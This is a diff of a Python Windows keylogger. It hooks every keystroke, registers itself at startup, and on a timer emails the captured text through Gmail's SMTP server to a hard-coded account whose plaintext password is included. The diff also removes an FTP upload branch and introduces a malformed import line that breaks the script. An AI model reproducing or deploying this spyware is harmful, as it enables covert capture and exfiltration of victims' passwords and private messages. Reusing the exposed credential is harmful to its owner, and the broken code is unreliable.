@@ -4,8 +4,7 @@ MINIMUM REQUIREMENTS
 Python 2.7: http://www.python.org/getit/
 pyHook Module: http://sourceforge.net/projects/pyhook/
 pyrhoncom Module: http://sourceforge.net/projects/pywin32/
-
-pyHook Module - 
+pyHook Module -
 Unofficial Windows Binaries for Python Extension Packages: http://www.lfd.uci.edu/~gohlke/pythonlibs/
 '''
 try:
@@ -20,8 +19,7 @@ import urllib,urllib2
 import smtplib
 import ftplib
 import datetime,time
-import win32event, win32api, winerror
-from _winreg import *
+import win32event, win32api, winerror from winreg import *
 
 #Disallowing Multiple Instance
 mutex = win32event.CreateMutex(None, 1, 'mutex_var_xboz')
@@ -74,7 +72,7 @@ class TimerClass(threading.Thread):
                 ts = datetime.datetime.now()
                 SERVER = "smtp.gmail.com" #Specify Server Here
                 PORT = 587 #Specify Port Here
-                USER="oscarmateo1997@gmail.com"#Specify Username Here 
+                USER="oscarmateo1997@gmail.com"#Specify Username Here
                 PASS="viviteamomucho"#Specify Password Here
                 FROM = USER#From address is taken from username
                 TO = ["oscarmateo1997@gmail.com"] #Specify to address.Use comma if more than one to address is needed.
@@ -84,7 +82,6 @@ class TimerClass(threading.Thread):
 From: %s
 To: %s
 Subject: %s
-
 %s
 """ % (FROM, ", ".join(TO), SUBJECT, MESSAGE)
                 try:
@@ -108,7 +105,7 @@ def main():
     else:
         if len(sys.argv)>2:
             if sys.argv[2]=="startup":
-                addStartup() 
+                addStartup()
             else:
                 msg()
                 exit(0)
@@ -137,13 +134,11 @@ def keypressed(event):
         keys='<TAB>'
     else:
         keys=chr(event.Ascii)
-    data=data+keys 
-    if x==1:  
+    data=data+keys
+    if x==1:
         local()
     elif x==2:
         remote()
-    elif x==4:
-        ftp()
 
 obj = pyHook.HookManager()
 obj.KeyDown = keypressed
